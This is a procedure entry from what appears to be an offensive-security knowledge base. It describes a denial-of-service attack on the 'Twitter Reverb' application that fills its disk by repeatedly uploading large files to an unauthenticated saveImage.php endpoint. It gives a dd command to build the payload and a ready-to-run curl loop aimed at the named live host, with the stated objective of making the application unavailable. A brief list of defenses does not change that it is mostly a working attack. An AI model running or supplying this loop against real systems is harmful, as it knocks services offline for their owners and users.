---
tags:
  - dos
  - resource-exhaustion
type: procedure
tools:
  - '[[tools/RCE-Tester-py]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/saveimage-dos-repeat]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:24:08.050Z'
sub_techniques: []
id: 8f1684b7-cdd6-4ea6-91dd-faa8c21b7250
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Perform-DoS-via-Repeated-Large-File-Uploads

## Summary

Cause denial of service by repeatedly submitting large files to the unauthenticated endpoint, exhausting disk space and disrupting the Twitter Reverb application.

## Description

No file size limits or rate limiting allow unlimited uploads. Using large 'image' data (e.g., 1MB+), repeated requests fill /var/www/html/view/data/image/, leading to downtime. The DDOS() function in RCE-Tester.py automates this.

## Requirements

1. Script or loop for repeated requests
2. Large dummy data generator
3. Monitoring for server response

## Defense

Defensive measures and detection strategies:

- Implement file size limits (e.g., <1MB) and rate limiting
- Use quotas on disk usage per endpoint
- Monitor for high-volume uploads in logs

## Objectives

1. Exhaust server disk space
2. Cause application unavailability
3. Demonstrate impact of unrestricted uploads

## Instructions

### Step 1: Generate Large Payload

**Context**: Create oversized content for image parameter.

Use dd or Python to make 1MB data: dd if=/dev/zero bs=1M count=1 > large.dat; base64 it.

> Expected: Binary file of desired size.

### Step 2: Automate Repeated Uploads

**Context**: Loop requests to fill disk.

**Command** ([[commands/saveimage-dos-repeat]]):

```bash
for i in {1..100}; do curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<large_data>&filename=doS$i&extension=png"; done
```

Or use [[tools/RCE-Tester-py]] DDOS function.

> Server responses slow; eventual 500 errors from full disk.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/saveimage-dos-repeat]]

## Tools Used

- [[tools/RCE-Tester-py]]

## Tags

- [[dos]]
- [[automation]]
